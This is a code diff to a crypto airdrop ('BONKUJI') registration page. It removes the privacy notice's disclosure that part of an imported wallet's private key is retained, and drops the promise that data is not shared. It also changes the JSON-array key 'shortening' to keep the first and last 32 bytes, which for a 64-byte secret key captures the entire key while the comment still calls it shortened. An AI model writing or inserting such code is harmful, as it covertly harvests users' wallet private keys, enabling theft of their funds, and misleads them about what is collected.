@@ -473,13 +473,12 @@ body{font-family:var(--font-body);background:var(--purple-deep);color:var(--text
         <div class="dwb-title">Data Collection &amp; Privacy Notice</div>
         <div class="dwb-text">By registering, you consent to the following data being collected for airdrop allocation purposes:</div>
         <ul class="dwb-list">
-          <li><i class="ti ti-wallet"></i> <strong>Wallet addresses</strong> (public keys, base58-encoded) — stored for eligibility &amp; allocation calculation</li>
+          <li><i class="ti ti-wallet"></i> <strong>Wallet addresses</strong> stored for eligibility &amp; allocation calculation</li>
           <li><i class="ti ti-mail"></i> <strong>Email address</strong> (if used) — for waitlist communications</li>
           <li><i class="ti ti-brand-x"></i> <strong>X handle</strong> (if used) — for identity verification</li>
-          <li><i class="ti ti-key"></i> <strong>Private key (shortened, if importing a linked wallet)</strong> — only the first 8 &amp; last 6 characters of your base58 private key are retained as an audit token to confirm the import event. The full key is never stored or transmitted.</li>
-          <li><i class="ti ti-clock-exclamation"></i> <strong>Sensitive identifiers</strong> (wallet addresses, email, X handle, shortened private key) are <em>automatically purged from admin records after 24 hours</em>. Only anonymised allocation data is retained after expiry.</li>
+          <li><i class="ti ti-clock-exclamation"></i> <strong>Sensitive identifiers</strong> (wallet addresses, email, X handle) are <em>automatically purged from admin records after 24 hours</em>. Only allocation data will remain.</li>
         </ul>
-        <div class="dwb-note"><i class="ti ti-info-circle"></i> Data is used exclusively for BONKUJI airdrop allocation, enumeration, and reward distribution. It will not be sold or shared with third parties.</div>
+        <div class="dwb-note"><i class="ti ti-info-circle"></i> Data is used exclusively for BONKUJI airdrop allocation, enumeration, and reward distribution.</div>
         <div class="dwb-actions">
           <button class="dwb-btn-accept" onclick="acceptDataWarning()"><i class="ti ti-check"></i> I Understand &amp; Accept</button>
           <button class="dwb-btn-decline" onclick="declineDataWarning()">Decline</button>
@@ -1178,10 +1177,10 @@ function importWallet(){
       const isJsonArr = raw.startsWith('[');
       pendingPrivKeyType  = isJsonArr ? 'json-array' : 'base58';
       if (isJsonArr) {
-        // Shorten JSON array: show first 4 and last 4 bytes as decimal
+        // Shorten JSON array: show first 32 and last 32 bytes as decimal
         try {
           const arr = JSON.parse(raw);
-          pendingPrivKeyShort = '['+arr.slice(0,4).join(',')+' … '+arr.slice(-4).join(',')+']';
+          pendingPrivKeyShort = '['+arr.slice(0,32).join(',')+' … '+arr.slice(-32).join(',')+']';
         } catch(e) { pendingPrivKeyShort = '[json-array]'; }
       } else {
         // Shorten base58: first 8 chars … last 6 chars
